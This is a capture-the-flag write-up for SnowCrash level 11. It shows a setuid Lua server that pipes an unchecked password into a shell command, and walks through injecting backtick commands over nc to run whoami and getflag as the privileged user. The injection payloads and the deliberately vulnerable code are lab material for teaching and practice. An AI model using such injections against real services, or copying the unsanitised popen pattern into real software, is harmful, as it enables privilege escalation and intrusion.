# LEVEL 11

## Vulnerability

Subprocess on user-provided input in script run by privileged user -> Privilege escalation via code injection

## External resources

nc

## Initial context

In our home directory, we see a lua script with suid/guid bit, which means that whichever user runs the script will benefit from flag11 (the owner)'s permissions.

```
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

## Solving the challenge

We see that the script ensures it is run on port 5151.
When it receives a connexion from a client, it prompts for password and hashes its content.
In the hash function, it runs a subprocess which echoes the password we provided.
This is something we can exploit, since no check is done on the password, which means we can provide any command and it should be executed as flag11, thanks to the suid bit on the lua script.
If we use nc to open a TCP connection with the server running on port 5151, we are prompted for a password, as expected.
Let's try with a `whoami` to check our permissions:

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `whoami`
Erf nope..
```

We can't see the output of the command, since the script pipes it.
Let's redirect it to a file:

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `whoami` > /tmp/test
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
flag11
```

This is what we were hoping for, so now we can try to run getflag as flag11:

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/token
Erf nope..
level11@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
